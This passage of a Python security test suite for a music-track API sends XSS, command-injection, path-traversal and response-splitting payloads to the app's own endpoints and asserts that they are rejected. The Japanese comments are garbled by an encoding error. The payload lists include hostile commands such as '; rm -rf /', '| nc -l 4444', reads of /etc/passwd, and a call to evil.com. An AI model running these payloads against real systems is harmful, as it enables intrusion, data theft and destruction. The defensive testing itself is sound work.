            # Unicode/„Ç®„É≥„Ç≥„Éº„Éá„Ç£„É≥„Ç∞ÂõûÈÅø
            "<script>alert(\u0027xss\u0027)</script>",
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            
            # DOM Based XSS
            "<img src=x onerror=eval(atob('YWxlcnQoJ3hzcycp'))>",  # Base64: alert('xss')
        ]
        
        for payload in xss_payloads:
            # Ê•ΩÊõ≤„Çø„Ç§„Éà„É´„Åß„ÅÆXSS„ÉÜ„Çπ„Éà
            track_data = {
                "title": payload,
                "description": "XSS test track",
                "genre": "„ÉÜ„Çπ„Éà",
                "duration": 180,
                "price": 300
            }
            
            headers = {"Authorization": "Bearer mock_token_artist"}
            response = self.client.post("/api/v1/tracks/", 
                                      headers=headers, json=track_data)
            
            if response.status_code == 200:
                # ‰ΩúÊàê„Åï„Çå„ÅüÊ•ΩÊõ≤„ÇíÂèñÂæó„Åó„Å¶XSS„Éö„Ç§„É≠„Éº„Éâ„ÅåÈÅ©Âàá„Å´„Ç®„Çπ„Ç±„Éº„Éó„Åï„Çå„Å¶„ÅÑ„Çã„ÅãÁ¢∫Ë™ç
                created_track = response.json()
                track_id = created_track["id"]
                
                detail_response = self.client.get(f"/api/v1/tracks/{track_id}")
                if detail_response.status_code == 200:
                    detail_content = detail_response.text
                    
                    # XSS„Éö„Ç§„É≠„Éº„Éâ„ÅåÂÆüË°åÂèØËÉΩ„Å™ÂΩ¢„ÅßÂê´„Åæ„Çå„Å¶„ÅÑ„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
                    dangerous_patterns = [
                        "<script", "javascript:", "onerror=", "onload=",
                        "onclick=", "onmouseover=", "onfocus="
                    ]
                    
                    for pattern in dangerous_patterns:
                        assert pattern.lower() not in detail_content.lower()
    
    def test_command_injection(self):
        """„Ç≥„Éû„É≥„Éâ„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥ÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "; rm -rf /",
            "| nc -l 4444",
            "; ping evil.com",
        ]
        
        for payload in command_injection_payloads:
            # „Éï„Ç°„Ç§„É´„Ç¢„ÉÉ„Éó„É≠„Éº„ÉâÊôÇ„ÅÆ„Éï„Ç°„Ç§„É´Âêç„Åß„ÅÆ„Ç≥„Éû„É≥„Éâ„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥
            headers = {"Authorization": "Bearer mock_token_artist"}
            files = {"file": (f"test{payload}.mp3", b"audio content", "audio/mpeg")}
            
            response = self.client.post("/api/v1/tracks/upload/audio",
                                      headers=headers, files=files)
            
            # „Ç≥„Éû„É≥„Éâ„Ç§„É≥„Ç∏„Çß„ÇØ„Ç∑„Éß„É≥„ÅØÈò≤„Åå„Çå„Çã„Åπ„Åç
            assert response.status_code in [400, 422]
    
    def test_path_traversal_comprehensive(self):
        """ÂåÖÊã¨ÁöÑ„Éë„Çπ„Éà„É©„Éê„Éº„Çµ„É´ÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
        ]
        
        for payload in path_traversal_payloads:
            # „Éï„Ç°„Ç§„É´„Ç¢„ÇØ„Çª„ÇπÁ≥ª„Ç®„É≥„Éâ„Éù„Ç§„É≥„Éà„Åß„ÅÆ„Éë„Çπ„Éà„É©„Éê„Éº„Çµ„É´
            response = self.client.get(f"/api/v1/tracks/{quote(payload)}")
            assert response.status_code in [400, 404, 422]
            
            # „Ç¢„ÉÉ„Éó„É≠„Éº„ÉâÊôÇ„ÅÆ„Éï„Ç°„Ç§„É´Âêç„Åß„ÅÆÊîªÊíÉ
            headers = {"Authorization": "Bearer mock_token_artist"}
            files = {"file": (payload, b"content", "audio/mpeg")}
            
            upload_response = self.client.post("/api/v1/tracks/upload/audio",
                                             headers=headers, files=files)
            assert upload_response.status_code in [400, 422]
    
    def test_http_response_splitting(self):
        """HTTP„É¨„Çπ„Éù„É≥„ÇπÂàÜÂâ≤ÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        response_splitting_payloads = [
            "test\r\nSet-Cookie: admin=true",
            "test\r\n\r\n<script>alert('xss')</script>",
            "test%0d%0aSet-Cookie:%20admin=true",
            "test\x0d\x0aContent-Length: 0\x0d\x0a\x0d\x0aHTTP/1.1 200 OK\x0d\x0a",
        ]
        
        for payload in response_splitting_payloads:
            response = self.client.get(f"/api/v1/tracks/?search={quote(payload)}")
            
            # „É¨„Çπ„Éù„É≥„Çπ„Éò„ÉÉ„ÉÄ„Éº„ÅåÈÅ©Âàá„Å´Âá¶ÁêÜ„Åï„Çå„Å¶„ÅÑ„Çã„Åì„Å®„ÇíÁ¢∫Ë™ç
            assert response.status_code in [200, 400, 422]
            
            # ÊÇ™ÊÑè„ÅÆ„ÅÇ„Çã„Éò„ÉÉ„ÉÄ„Éº„ÅåÊ≥®ÂÖ•„Åï„Çå„Å¶„ÅÑ„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™ç
            dangerous_headers = ["set-cookie", "location", "content-type"]
            for header in dangerous_headers:
                if header in response.headers:
                    assert "admin=true" not in response.headers[header].lower()
                    assert "<script>" not in response.headers[header].lower()
    
    def test_timing_attacks(self):
        """„Çø„Ç§„Éü„É≥„Ç∞ÊîªÊíÉ„ÉÜ„Çπ„Éà"""
        # Â≠òÂú®„Åô„Çã„É¶„Éº„Ç∂„Éº„Å®Â≠òÂú®„Åó„Å™„ÅÑ„É¶„Éº„Ç∂„Éº„Åß„ÅÆÂøúÁ≠îÊôÇÈñìÂ∑Æ„ÇíÊ∏¨ÂÆö
        existing_email = "listener1@example.com"  # Seed„Éá„Éº„Çø„ÅÆÊó¢Â≠ò„É°„Éº„É´
        nonexistent_email = "nonexistent123456@example.com"
        
        # Â≠òÂú®„Åô„Çã„É¶„Éº„Ç∂„Éº„Åß„ÅÆË™çË®ºË©¶Ë°åÊôÇÈñì
        start_time = time.time()
        existing_response = self.client.post("/api/v1/auth/login", json={
            "email": existing_email,
            "password": "wrong_password"
        })
        existing_time = time.time() - start_time
        
        # Â≠òÂú®„Åó„Å™„ÅÑ„É¶„Éº„Ç∂„Éº„Åß„ÅÆË™çË®ºË©¶Ë°åÊôÇÈñì
        start_time = time.time()
        nonexistent_response = self.client.post("/api/v1/auth/login", json={
            "email": nonexistent_email,
            "password": "wrong_password"
        })
        nonexistent_time = time.time() - start_time
        
        # ÂøúÁ≠îÊôÇÈñì„ÅÆÂ∑Æ„ÅåÈÅéÂ∫¶„Å´Â§ß„Åç„Åè„Å™„ÅÑ„Åì„Å®„ÇíÁ¢∫Ë™çÔºà„Çø„Ç§„Éü„É≥„Ç∞ÊîªÊíÉÈò≤Ê≠¢Ôºâ
        time_difference = abs(existing_time - nonexistent_time)
        assert time_difference < 1.0  # 1Áßí‰ª•ÂÜÖ„ÅÆÂ∑Æ
        
        # „Å©„Å°„Çâ„ÇÇË™çË®ºÂ§±Êïó„Å´„Å™„Çã„Åì„Å®„ÇíÁ¢∫Ë™ç
        assert existing_response.status_code in [400, 401]
        assert nonexistent_response.status_code in [400, 401]